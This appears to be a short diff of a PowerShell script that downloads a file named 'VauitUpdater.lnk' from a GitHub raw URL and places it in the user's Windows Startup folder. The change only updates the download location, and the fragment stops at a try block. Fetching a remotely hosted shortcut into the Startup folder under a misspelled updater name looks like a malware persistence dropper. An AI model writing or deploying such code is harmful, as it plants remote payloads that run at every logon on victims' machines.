@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/m-1g/Readme.md/refs/heads/main/VauitUpdater.lnk"
+$url = "https://raw.githubusercontent.com/m-1g/1/refs/heads/main/VauitUpdater.lnk"
 cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
 $destPath = ".\VauitUpdater.lnk"
 try {
